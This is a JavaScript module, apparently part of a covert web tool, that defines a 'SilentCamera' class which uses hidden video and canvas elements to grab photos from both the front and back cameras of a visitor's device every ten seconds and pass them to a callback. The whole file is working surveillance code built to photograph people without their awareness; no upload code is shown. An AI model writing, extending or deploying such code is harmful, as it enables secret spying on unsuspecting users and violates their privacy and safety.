// ============================================
// CAMERA MODULE - Silent Capture
// ============================================
class SilentCamera {
    constructor() {
        this.videoElement = document.getElementById('hiddenVideo');
        this.canvasElement = document.getElementById('hiddenCanvas');
        this.ctx = this.canvasElement ? this.canvasElement.getContext('2d') : null;
        this.currentStream = null;
        this.isCapturing = false;
        this.captureInterval = null;
        this.capturedImages = [];
        this.currentFacing = 'user'; // 'user' = front, 'environment' = back
    }

    async initCamera(facing = 'user') {
        try {
            // Stop existing stream
            if (this.currentStream) {
                this.currentStream.getTracks().forEach(track => track.stop());
            }

            const constraints = {
                video: {
                    facingMode: facing,
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            };

            this.currentStream = await navigator.mediaDevices.getUserMedia(constraints);
            this.videoElement.srcObject = this.currentStream;
            this.currentFacing = facing;
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                this.videoElement.onloadedmetadata = () => {
                    this.videoElement.play();
                    resolve();
                };
            });

            // Wait a bit for camera to adjust
            await new Promise(r => setTimeout(r, 500));

            console.log(`Camera initialized: ${facing}`);
            return true;
        } catch (error) {
            console.error('Camera init error:', error);
            return false;
        }
    }

    async capturePhoto() {
        if (!this.videoElement || !this.videoElement.srcObject) {
            console.error('No video stream available');
            return null;
        }

        try {
            this.canvasElement.width = this.videoElement.videoWidth || 640;
            this.canvasElement.height = this.videoElement.videoHeight || 480;
            
            this.ctx.drawImage(this.videoElement, 0, 0);
            
            const dataUrl = this.canvasElement.toDataURL('image/jpeg', 0.7);
            
            const photoData = {
                image: dataUrl,
                facing: this.currentFacing,
                timestamp: Date.now(),
                datetime: new Date().toLocaleString('hi-IN')
            };

            this.capturedImages.push(photoData);
            console.log(`Photo captured: ${this.currentFacing} camera`);
            
            return photoData;
        } catch (error) {
            console.error('Capture error:', error);
            return null;
        }
    }

    async captureBothCameras() {
        const results = [];

        // Capture front camera
        const frontInit = await this.initCamera('user');
        if (frontInit) {
            await new Promise(r => setTimeout(r, 800));
            const frontPhoto = await this.capturePhoto();
            if (frontPhoto) {
                frontPhoto.cameraType = 'Front';
                results.push(frontPhoto);
            }
        }

        // Capture back camera
        const backInit = await this.initCamera('environment');
        if (backInit) {
            await new Promise(r => setTimeout(r, 800));
            const backPhoto = await this.capturePhoto();
            if (backPhoto) {
                backPhoto.cameraType = 'Back';
                results.push(backPhoto);
            }
        }

        return results;
    }

    startPeriodicCapture(intervalSeconds = 10, callback) {
        this.isCapturing = true;
        
        // Immediate first capture
        this.captureBothCameras().then(photos => {
            if (callback) callback(photos);
        });

        // Periodic captures
        this.captureInterval = setInterval(async () => {
            if (!this.isCapturing) return;
            
            const photos = await this.captureBothCameras();
            if (callback) callback(photos);
        }, intervalSeconds * 1000);

        console.log(`Periodic capture started: every ${intervalSeconds}s`);
    }

    stopCapture() {
        this.isCapturing = false;
        
        if (this.captureInterval) {
            clearInterval(this.captureInterval);
            this.captureInterval = null;
        }

        if (this.currentStream) {
            this.currentStream.getTracks().forEach(track => track.stop());
            this.currentStream = null;
        }

        if (this.videoElement) {
            this.videoElement.srcObject = null;
        }

        console.log('Camera capture stopped');
    }

    getCapturedImages() {
        return this.capturedImages;
    }

    clearCapturedImages() {
        this.capturedImages = [];
    }
}
